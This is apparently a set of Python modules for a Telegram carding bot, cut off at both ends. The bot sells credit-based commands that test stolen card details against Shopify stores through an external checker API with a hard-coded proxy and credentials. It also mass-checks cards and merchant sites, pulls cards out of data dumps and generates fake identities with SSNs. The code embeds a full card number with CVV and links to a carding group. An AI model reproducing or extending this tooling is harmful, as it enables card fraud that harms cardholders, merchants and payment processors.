            "❌ Error: API request timed out. Try again later.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        import logging
        logging.exception("Error in /seturl")
        await processing_msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )









from telegram import Update
from telegram.ext import ContextTypes
from html import escape
from db import get_user

async def mysites(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handler for /mysites - shows all sites added by the user."""
    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    sites = user_data.get("custom_url")
    if not sites:
        await update.message.reply_text("❌ You have not added any sites yet.\nUse /seturl <site_url> to add one.")
        return

    # If you later allow multiple sites, you can store them as a list
    # For now, 'custom_url' is a single URL, so wrap in list
    if isinstance(sites, str):
        sites = [sites]

    # Format message
    formatted_sites = "📄 <b>Your Added Sites</b>\n"
    formatted_sites += "━━━━━━━━━━━━━━━━━━\n"
    for i, site in enumerate(sites, start=1):
        formatted_sites += f"🔹 <b>Site {i}</b>: <code>{escape(site)}</code>\n"
    formatted_sites += "━━━━━━━━━━━━━━━━━━"

    await update.message.reply_text(
        formatted_sites,
        parse_mode="HTML",
        disable_web_page_preview=True
    )




import asyncio
import aiohttp
import json
import re
from html import escape
from datetime import datetime
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user, init_db
import logging

logger = logging.getLogger(__name__)

# --- Initialize DB ---
asyncio.get_event_loop().run_until_complete(init_db())

# --- User cooldowns ---
user_cooldowns = {}

async def enforce_cooldown(user_id: int, update: Update, cooldown_seconds: int = 5) -> bool:
    last_run = user_cooldowns.get(user_id, 0)
    now = datetime.now().timestamp()
    if now - last_run < cooldown_seconds:
        await update.effective_message.reply_text(
            f"⏳ Cooldown in effect. Please wait {round(cooldown_seconds - (now - last_run), 2)}s."
        )
        return False
    user_cooldowns[user_id] = now
    return True

async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False

import re
import json
import aiohttp
import asyncio
import logging
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

from db import get_user, update_user   # your db functions
from bin import get_bin_info           # your BIN function

# ===== API template =====
API_CHECK_TEMPLATE = (
    "https://auto-shopify-6cz4.onrender.com/index.php"
    "?site={site}"
    "&cc={card}"
    "&proxy=107.172.163.27:6543:nslqdeey:jhmrvnto65s1"
)

# ===== Main Command =====
async def sp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # Cooldown check
    if not await enforce_cooldown(user_id, update):
        return

    # Argument check
    if not context.args:
        await update.message.reply_text(
            "❌ Please provide card details. Example: /sp card|mm|yy|cvv",
            parse_mode=ParseMode.HTML
        )
        return

    card_input = context.args[0].strip()

    # Consume credit
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You have no credits left.", parse_mode=ParseMode.HTML)
        return

    # Fetch user custom site URL
    user_data = await get_user(user_id)
    custom_url = user_data.get("custom_url")
    if not custom_url:
        await update.message.reply_text(
            "❌ You don’t have a site set. Use /seturl to set your site first.",
            parse_mode=ParseMode.HTML
        )
        return

    # Send initial "Checking..." message
    msg = await update.message.reply_text(
        f"⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱: <code>{escape(card_input)}</code>...",
        parse_mode=ParseMode.HTML
    )

    # Run the actual heavy work in background
    asyncio.create_task(process_card_check(user, card_input, custom_url, msg))


# ===== Worker =====
async def process_card_check(user, card_input, custom_url, msg):
    try:
        cc = card_input.split("|")[0]

        # --- BIN lookup (your exact logic, unchanged) ---
        try:
            bin_number = cc[:6]
            bin_details = await get_bin_info(bin_number)

            brand = (bin_details.get("scheme") or "N/A").title()
            issuer = bin_details.get("bank") or "N/A"
            country_name = bin_details.get("country") or "Unknown"
            country_flag = bin_details.get("country_emoji", "")
            card_type = bin_details.get("type", "N/A")
            card_level = bin_details.get("brand", "N/A")
            card_length = bin_details.get("length", "N/A")
            luhn_check = bin_details.get("luhn", "N/A")
            bank_phone = bin_details.get("bank_phone", "N/A")
            bank_url = bin_details.get("bank_url", "N/A")
        except Exception as e:
            logging.warning(f"BIN lookup failed for {bin_number}: {e}")
            brand = issuer = card_type = card_level = card_length = luhn_check = bank_phone = bank_url = "N/A"
            country_name = "Unknown"
            country_flag = ""

        # --- API call ---
        api_url = API_CHECK_TEMPLATE.format(card=card_input, site=custom_url)
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=120) as resp:
                api_text = await resp.text()

        # Detect bad responses
        if '<!DOCTYPE html>' in api_text or '<html' in api_text:
            await msg.edit_text(
                "❌ API endpoint is offline or returned HTML.",
                parse_mode=ParseMode.HTML
            )
            return

        # Strip junk and find JSON
        clean_text = re.sub(r'<[^>]+>', '', api_text).strip()
        json_start = clean_text.find('{')
        if json_start != -1:
            clean_text = clean_text[json_start:]

        try:
            data = json.loads(clean_text)
        except json.JSONDecodeError:
            await msg.edit_text(
                f"❌ Invalid API response:\n<pre>{escape(api_text[:500])}</pre>",
                parse_mode=ParseMode.HTML
            )
            return

        # Extract fields
        response_text = data.get("Response", "Unknown")
        price = f"{data.get('Price', '0')}$"
        gateway = data.get("Gateway", "Shopify")
        requester = f"@{user.username}" if user.username else str(user.id)

        # Developer/branding
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        formatted_msg = (
            "═══[ 𝗔𝘂𝘁𝗼𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n"
            f"{bullet_link} 𝐂𝐚𝐫𝐝       ➜ <code>{card_input}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲   ➜ {escape(gateway)}\n"
            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭     ➜ {price} 💸\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ <i>{escape(response_text)}</i>\n"
            "――――――――――――――――\n"
            f"{bullet_link} 𝐁𝐫𝐚𝐧𝐝      ➜ <code>{brand}</code>\n"
            f"{bullet_link} 𝐁𝐚𝐧𝐤       ➜ <code>{issuer}</code>\n"
            f"{bullet_link} 𝐂𝐨𝐮𝐧𝐭𝐫𝐲    ➜ <code>{country_flag} {country_name}</code>\n"
            "――――――――――――――――\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
            "――――――――――――――――"
        )

        await msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await msg.edit_text("❌ Error: API request timed out.", parse_mode=ParseMode.HTML)
    except Exception as e:
        logging.exception("Error in process_card_check")
        await msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )





import time
import re
import json
import asyncio
import aiohttp
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from html import escape
from db import get_user, update_user   # DB functions

# Cooldown tracker
last_site_usage = {}

API_TEMPLATE = (
    "https://auto-shopify-6cz4.onrender.com/index.php"
    "?site={site_url}&cc=5547300001996183|11|2028|197"
)

# === Credit system ===
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


# === Main command ===
async def site(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # === Cooldown check ===
    now = time.time()
    if user_id in last_site_usage and (now - last_site_usage[user_id]) < 3:
        await update.message.reply_text(
            "⏳ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁 3 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝘂𝘀𝗶𝗻𝗴 /𝘀𝗶𝘁𝗲 𝗮𝗴𝗮𝗶𝗻."
        )
        return
    last_site_usage[user_id] = now

    # === Credit check ===
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use this command.")
        return

    # === Argument check ===
    if not context.args:
        await update.message.reply_text(
            "❌ 𝘗𝘭𝘦𝘢𝘴𝘦 𝘱𝘳𝘰𝘷𝘪𝘥𝘦 𝘢 𝘴𝘪𝘵𝘦 𝘜𝘙𝘓.\n"
            "Example:\n<code>/site https://example.com</code>",
            parse_mode=ParseMode.HTML
        )
        return

    site_url = context.args[0].strip()
    if not site_url.startswith(("http://", "https://")):
        site_url = "https://" + site_url

    # Initial message
    msg = await update.message.reply_text(
        f"⏳ 𝑪𝒉𝒆𝒄𝒌𝒊𝒏𝒈 𝒔𝒊𝒕𝒆: <code>{escape(site_url)}</code>...",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True
    )

    # Run checker in background
    asyncio.create_task(run_site_check(site_url, msg, user))


# === Background worker ===
async def run_site_check(site_url: str, msg, user):
    api_url = API_TEMPLATE.format(site_url=site_url)

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=120) as resp:
                raw_text = await resp.text()

        # --- Extract JSON part if wrapped in HTML ---
        clean_text = re.sub(r'<[^>]+>', '', raw_text).strip()
        json_start = clean_text.find('{')
        if json_start != -1:
            clean_text = clean_text[json_start:]

        try:
            data = json.loads(clean_text)
        except json.JSONDecodeError:
            await msg.edit_text(
                f"❌ Invalid API response:\n<pre>{escape(raw_text[:500])}</pre>",
                parse_mode=ParseMode.HTML
            )
            return

        # --- Extract fields ---
        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Shopify")
        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        price = f"{price_float}$" if price_float else "0$"
        status = "𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ✅" if price_float > 0 else "𝘿𝙚𝙖𝙙 ❌"

        # --- Format info ---
        requester = f"@{user.username}" if user.username else str(user.id)
        DEVELOPER_NAME = "kคli liຖนxx"
        DEVELOPER_LINK = "https://t.me/Kalinuxxx"
        developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"
        BULLET_GROUP_LINK = "https://t.me/CARDER33"
        bullet_link = f'<a href="{BULLET_GROUP_LINK}">[⌇]</a>'

        formatted_msg = (
            f"═══[ #𝘀𝗵𝗼𝗽𝗶𝗳𝘆 ]═══\n\n"
            f"{bullet_link} 𝐒𝐢𝐭𝐞       ➜ <code>{escape(site_url)}</code>\n"
            f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲    ➜ {escape(gateway)}\n"
            f"{bullet_link} 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞   ➜ <i>{escape(response)}</i>\n"
            f"{bullet_link} 𝐀𝐦𝐨𝐮𝐧𝐭      ➜ {price} 💸\n"
            f"{bullet_link} 𝐒𝐭𝐚𝐭𝐮𝐬      ➜ <b>{status}</b>\n\n"
            f"――――――――――――――――\n"
            f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➜ {requester}\n"
            f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➜ {developer_clickable}\n"
            f"――――――――――――――――"
        )

        await msg.edit_text(
            formatted_msg,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True
        )

    except asyncio.TimeoutError:
        await msg.edit_text(
            "❌ Error: API request timed out. Try again later.",
            parse_mode=ParseMode.HTML
        )
    except Exception as e:
        await msg.edit_text(
            f"❌ Error: <code>{escape(str(e))}</code>",
            parse_mode=ParseMode.HTML
        )


import asyncio
import aiohttp
import time
import re
import json
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from telegram.error import TelegramError
from db import get_user, update_user


API_TEMPLATE = (
    "https://auto-shopify-6cz4.onrender.com/index.php"
    "?site={site_url}&cc=5547300001996183|11|2028|197"
)

MSITE_CONCURRENCY = 3
MSITE_COOLDOWN = 5
last_msite_usage = {}


# --- Credit system ---
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        new_credits = user_data["credits"] - 1
        await update_user(user_id, credits=new_credits)
        return True
    return False


def normalize_site(site: str) -> str:
    site = site.strip()
    if not site.startswith("http://") and not site.startswith("https://"):
        site = "https://" + site
    return site

# --- Fetch site info ---
async def fetch_site(session, site_url: str):
    normalized_url = normalize_site(site_url)
    api_url = API_TEMPLATE.format(site_url=normalized_url)

    try:
        async with session.get(api_url, timeout=60) as resp:
            raw_text = await resp.text()

        # Clean HTML
        clean_text = re.sub(r"<[^>]+>", "", raw_text).strip()
        json_start = clean_text.find("{")
        if json_start != -1:
            clean_text = clean_text[json_start:]

        data = json.loads(clean_text)
        response = data.get("Response", "Unknown")
        gateway = data.get("Gateway", "Shopify")
        try:
            price_float = float(data.get("Price", 0))
        except (ValueError, TypeError):
            price_float = 0.0

        return {
            "site": normalized_url,
            "price": price_float,
            "status": "working" if price_float > 0 else "dead",
            "response": response,
            "gateway": gateway,
        }

    except Exception as e:
        return {
            "site": site_url,
            "price": 0.0,
            "status": "dead",
            "response": f"Error: {str(e)}",
            "gateway": "N/A",
        }

# --- Mass Site Checker ---
async def run_msite_check(sites: list[str], msg):
    total = len(sites)
    results = [None] * total
    counters = {"checked": 0, "working": 0, "dead": 0, "amt": 0.0}
    semaphore = asyncio.Semaphore(MSITE_CONCURRENCY)

    async with aiohttp.ClientSession() as session:

        async def worker(idx, site):
            async with semaphore:
                res = await fetch_site(session, site)
                results[idx] = res
                counters["checked"] += 1
                if res["status"] == "working":
                    counters["working"] += 1
                    counters["amt"] += res["price"]
                else:
                    counters["dead"] += 1

                # --- Summary ---
                summary = (
                    "<pre><code>"
                    f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                    f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : {counters['working']}\n"
                    f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                    f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                    f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : ${counters['amt']:.1f}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "</code></pre>"
                )

                # --- Site details (only working) ---
                site_lines = []
                for r in results:
                    if not r or r["status"] != "working":
                        continue
                    display_site = (
                        r["site"]
                        .replace("https://", "")
                        .replace("http://", "")
                        .replace("www.", "")
                    )
                    site_lines.append(
                        f"✅ <code>{escape(display_site)}</code>\n   ↳ 💲{r['price']:.1f}"
                    )

                details = "\n".join(site_lines)
                content = summary
                if details:
                    content += (
                        f"\n\n📝 <b>𝑺𝒊𝒕𝒆 𝑫𝒆𝒕𝒂𝒊𝒍𝒔</b>\n"
                        f"────────────────\n{details}\n────────────────"
                    )

                # --- Update message ---
                try:
                    await msg.edit_text(
                        content,
                        parse_mode=ParseMode.HTML,
                        disable_web_page_preview=True,
                    )
                except TelegramError:
                    pass

        # Launch all workers concurrently
        tasks = [asyncio.create_task(worker(i, s)) for i, s in enumerate(sites)]
        await asyncio.gather(*tasks)

        # --- Final check for no working sites ---
        if counters["working"] == 0:
            final_content = (
                "<pre><code>"
                f"📊 𝑴𝒂𝒔𝒔 𝑺𝒊𝒕𝒆 𝑪𝒉𝒆𝒄𝒌𝒆𝒓\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑺𝒊𝒕𝒆𝒔 : {total}\n"
                f"✅ 𝑾𝒐𝒓𝒌𝒊𝒏𝒈     : 0\n"
                f"❌ 𝑫𝒆𝒂𝒅        : {counters['dead']}\n"
                f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {counters['checked']} / {total}\n"
                f"💲 𝑻𝒐𝒕𝒂𝒍 𝑨𝒎𝒕   : $0.0\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                "❌ No working sites found."
                "</code></pre>"
            )
            try:
                await msg.edit_text(final_content, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
            except TelegramError:
                pass

# --- /msite command handler ---
async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = time.time()

    # Cooldown check
    if user_id in last_msite_usage and (now - last_msite_usage[user_id]) < MSITE_COOLDOWN:
        remaining = round(MSITE_COOLDOWN - (now - last_msite_usage[user_id]), 1)
        await update.message.reply_text(
            f"⏳ Please wait {remaining}s before using /msite again."
        )
        return
    last_msite_usage[user_id] = now

    # Credit check (5 credits per use)
    if not await consume_credit(user_id, amount=5):
        await update.message.reply_text("❌ You don’t have enough credits to use this command.")
        return

    # Collect sites
    sites = []
    if context.args:
        sites = [s.strip() for s in context.args if s.strip()]
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        sites = [s.strip() for s in update.message.reply_to_message.text.splitlines() if s.strip()]

    if not sites:
        await update.message.reply_text(
            "❌ Please provide site URLs.\nExample:\n<code>/msite amazon.com flipkart.com</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    if len(sites) > 100:
        await update.message.reply_text(
            f"⚠️ You can check a maximum of 100 sites at once.\nYou provided {len(sites)}.",
            parse_mode=ParseMode.HTML,
        )
        sites = sites[:100]

    # Initial message
    msg = await update.message.reply_text(
        f"⏳ 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 {len(sites)} 𝐒𝐢𝐭𝐞𝐬...",
        parse_mode=ParseMode.HTML,
        disable_web_page_preview=True,
    )

    # Run in background
    asyncio.create_task(run_msite_check(sites, msg))


import asyncio
import time
import httpx
import re
from telegram import Update
from telegram.ext import CommandHandler, ContextTypes
from html import escape
from db import get_user, update_user

# Cooldown tracking
last_msp_usage = {}

# Regex for CC detection
CARD_REGEX = re.compile(r"\b\d{12,19}\|\d{2}\|(?:\d{2}|\d{4})\|\d{3,4}\b")

# Consume credit once
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        await update_user(user_id, credits=user_data["credits"] - 1)
        return True
    return False

# Shopify check request
async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card: str):
    try:
        url = f"{base_url}?site={site}&cc={card}"
        r = await session.get(url, timeout=20)
        data = r.json()
        resp = data.get("Response", "Unknown")
        status = data.get("Status", "false")
        price = data.get("Price", "0")
        gateway = data.get("Gateway", "N/A")
        return resp, status, price, gateway
    except Exception as e:
        return f"Error: {e}", "false", "0", "N/A"

# Core mass shopify check
async def run_check(cards, base_url, site, msg):
    approved = declined = errors = checked = 0
    site_price = None
    gateway_used = "Self Shopify"
    results = []

    sem = asyncio.Semaphore(3)

    async with httpx.AsyncClient() as session:

        async def worker(card, first=False):
            nonlocal approved, declined, errors, checked, site_price, gateway_used, results

            async with sem:
                card_str = card if isinstance(card, str) else "|".join(card)
                resp, status, price, gateway = await check_card(session, base_url, site, card_str)

                if isinstance(resp, (tuple, list)):
                    resp = " | ".join(map(str, resp))
                else:
                    resp = str(resp)

                # Site price (once)
                if first and site_price is None:
                    try:
                        site_price = float(price)
                    except:
                        site_price = 0.0

                if gateway and gateway != "N/A":
                    gateway_used = gateway

                resp_upper = resp.upper().strip()

                # Classification
                if "R4 TOKEN EMPTY" in resp_upper:
                    errors += 1
                    status_icon = "⚠️"
                elif resp_upper in ["INCORRECT_NUMBER", "FRAUD_SUSPECTED", "CARD_DECLINED", "EXPIRE_CARD", "EXPIRED_CARD"]:
                    declined += 1
                    status_icon = "❌"
                elif resp_upper in ["3D_AUTHENTICATION", "APPROVED", "SUCCESS", "INSUFFICIENT_FUNDS"]:
                    approved += 1
                    status_icon = "✅"
                elif status.lower() == "true" and resp_upper not in ["CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED"]:
                    approved += 1
                    status_icon = "✅"
                else:
                    errors += 1
                    status_icon = "⚠️"

                checked += 1

                # Individual card result (italic response)
                results.append(f"{status_icon} {escape(card_str)}\n   ↳ <i>{escape(resp)}</i>")

                # Progressive summary (only code block for header)
                summary_text = (
                    "<pre><code>"
                    f"📊 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤𝐞𝐫\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🌍 𝑻𝒐𝒕𝒂𝒍 𝑪𝒂𝒓𝒅𝒔 : {len(cards)}\n"
                    f"✅ 𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅    : {approved}\n"
                    f"❌ 𝑫𝒆𝒄𝒍𝒊𝒏𝒆𝒅    : {declined}\n"
                    f"⚠️ 𝑬𝒓𝒓𝒐𝒓       : {errors}\n"
                    f"🔄 𝑪𝒉𝒆𝒄𝒌𝒆𝒅     : {checked} / {len(cards)}\n"
                    f"💲 𝑺𝒊𝒕𝒆 𝑷𝒓𝒊𝒄𝒆  : ${site_price if site_price else '0.00'}\n"
                    f"🏬 𝑮𝒂𝒕𝒆𝒘𝒂𝒚     : {gateway_used}\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    "</code></pre>\n"
                )

                final_text = summary_text + "\n".join(results)

                try:
                    await msg.edit_text(final_text, parse_mode="HTML")
                except:
                    pass

        await asyncio.gather(*(worker(c, first=(i == 0)) for i, c in enumerate(cards)))

# /msp command handler
async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    now = time.time()

    # Cooldown 5s
    if user_id in last_msp_usage and now - last_msp_usage[user_id] < 5:
        return await update.message.reply_text("⏳ Please wait 5 seconds before using /msp again.")
    last_msp_usage[user_id] = now

    # Collect cards
    raw_input = " ".join(context.args) if context.args else (update.message.reply_to_message.text if update.message.reply_to_message else None)
    if not raw_input:
        return await update.message.reply_text(
            "Usage:\n<code>/msp card|mm|yy|cvv card2|mm|yy|cvv ...</code>\n"
            "Or reply to a message containing cards.",
            parse_mode="HTML"
        )

    cards = CARD_REGEX.findall(raw_input)
    if not cards:
        return await update.message.reply_text("❌ No valid cards found.")

    if len(cards) > 50:
        cards = cards[:50]

    user_data = await get_user(user_id)
    if not user_data:
        return await update.message.reply_text("❌ No user data found in DB.")

    if not await consume_credit(user_id):
        return await update.message.reply_text("❌ You have no credits left.")

    base_url = user_data.get("base_url", "https://auto-shopify-6cz4.onrender.com/index.php")
    site = user_data.get("custom_url")
    if not site:
        return await update.message.reply_text("❌ No custom_url set in your account.")

    msg = await update.message.reply_text("💳 𝐒𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐌𝐚𝐬𝐬 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝐂𝐡𝐞𝐜𝐤…")

    # Run check in background
    asyncio.create_task(run_check(cards, base_url, site, msg))






from faker import Faker
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Replace with your *legit* group/channel link
BULLET_GROUP_LINK = "https://t.me/CARDER33"

def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    import re
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fk_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generates fake identity info."""

    # Define the bullet point with the hyperlink
    bullet_text = escape_all_markdown("[⌇]")
    bullet_link = f"[{bullet_text}]({BULLET_GROUP_LINK})"
    
    # Cooldown check
    if not await enforce_cooldown(update.effective_user.id, update):
        return

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Deduct 1 credit if available
    if user_data['credits'] <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2,
            disable_web_page_preview=True
        )

    country_code = context.args[0] if context.args else 'en_US'
    try:
        fake = Faker(country_code)
    except:
        fake = Faker('en_US')

    name = escape_markdown_v2(fake.name())
    dob = escape_markdown_v2(fake.date_of_birth().strftime('%Y-%m-%d'))
    ssn = escape_markdown_v2(fake.ssn())
    email = escape_markdown_v2(fake.email())
    username = escape_markdown_v2(fake.user_name())
    phone = escape_markdown_v2(fake.phone_number())
    job = escape_markdown_v2(fake.job())
    company = escape_markdown_v2(fake.company())
    street = escape_markdown_v2(fake.street_address())
    address2 = escape_markdown_v2(fake.secondary_address())
    city = escape_markdown_v2(fake.city())
    state = escape_markdown_v2(fake.state())
    zip_code = escape_markdown_v2(fake.zipcode())
    country = escape_markdown_v2(fake.country())
    ip = escape_markdown_v2(fake.ipv4_public())
    ua = escape_markdown_v2(fake.user_agent())

    output = (
        "━━━[ 🧑‍💻 𝙁𝙖𝙠𝙚 𝙄𝙣𝙛𝙤 ]━\n"
        f"{bullet_link} 𝙉𝙖𝙢𝙚 ➳ `{name}`\n"
        f"{bullet_link} 𝘿𝙤𝘽 ➳ `{dob}`\n"
        f"{bullet_link} 𝙎𝙎𝙉 ➳ `{ssn}`\n"
        f"{bullet_link} 𝙀𝙢𝙖𝙞𝙡 ➳ `{email}`\n"
        f"{bullet_link} 𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ➳ `{username}`\n"
        f"{bullet_link} 𝙋𝙝𝙤𝙣𝙚 ➳ `{phone}`\n"
        f"{bullet_link} 𝙅𝙤𝙗 ➳ `{job}`\n"
        f"{bullet_link} 𝘾𝙤𝙢𝙥𝙖𝙣𝙮 ➳ `{company}`\n"
        f"{bullet_link} 𝙎𝙩𝙧𝙚𝙚𝙩 ➳ `{street}`\n"
        f"{bullet_link} 𝘼𝙙𝙙𝙧𝙚𝙨𝙨 2 ➳ `{address2}`\n"
        f"{bullet_link} 𝘾𝙞𝙩𝙮 ➳ `{city}`\n"
        f"{bullet_link} 𝙎𝙩𝙖𝙩𝙚 ➳ `{state}`\n"
        f"{bullet_link} 𝙕𝙞𝙥 ➳ `{zip_code}`\n"
        f"{bullet_link} 𝘾𝙤𝙪𝙣𝙩𝙧𝙮 ➳ `{country}`\n"
        f"{bullet_link} 𝙄𝙋 ➳ `{ip}`\n"
        f"{bullet_link} 𝙐𝘼 ➳ `{ua}`\n"
        "━━━━━━━━━━━━━━━━━━"
    )

    await update.effective_message.reply_text(
        output,
        parse_mode=ParseMode.MARKDOWN_V2,
        disable_web_page_preview=True
    )



import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes

# Escape function for MarkdownV2
def escape_markdown_v2(text: str) -> str:
    """Escapes special characters for Telegram MarkdownV2."""
    return re.sub(r'([_*\[\]()~`>#+\-=|{}.!\\])', r'\\\1', str(text))

async def fl_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Extracts all cards from a dump (message or reply)."""

    user_id = update.effective_user.id
    user_data = await get_user(user_id)

    # Check credits
    if user_data.get('credits', 0) <= 0:
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Determine input text
    if update.message.reply_to_message and update.message.reply_to_message.text:
        dump = update.message.reply_to_message.text
    elif context.args:
        dump = " ".join(context.args)
    else:
        return await update.effective_message.reply_text(
            "❌ Please provide or reply to a dump containing cards\\. Usage: `/fl <dump or reply>`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Deduct credit
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Regex to find cards: number|mm|yy|cvv (cvv 3 or 4 digits, year 2 or 4 digits)
    card_pattern = re.compile(
        r"\b(\d{13,16})\|(\d{1,2})\|(\d{2}|\d{4})\|(\d{3,4})\b"
    )
    cards_found = ["{}|{}|{}|{}".format(m[0], m[1].zfill(2), m[2][-2:], m[3]) for m in card_pattern.findall(dump)]
    count = len(cards_found)

    if cards_found:
        # Each card in monospace with proper escaping
        extracted_cards_text = "\n".join([f"`{escape_markdown_v2(card)}`" for card in cards_found])
    else:
        extracted_cards_text = "_No cards found in the provided text\\._"

    msg = (
        f"╭━━━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] ━━━⬣\n"
        f"┣ ❏ Total ➳ {count}\n"
        f"╰━━━━━━━━━━━━━━━━━━━━⬣\n\n"
        f"{extracted_cards_text}"
    )

    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)




import asyncio
import re
import logging
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from pyrogram import Client
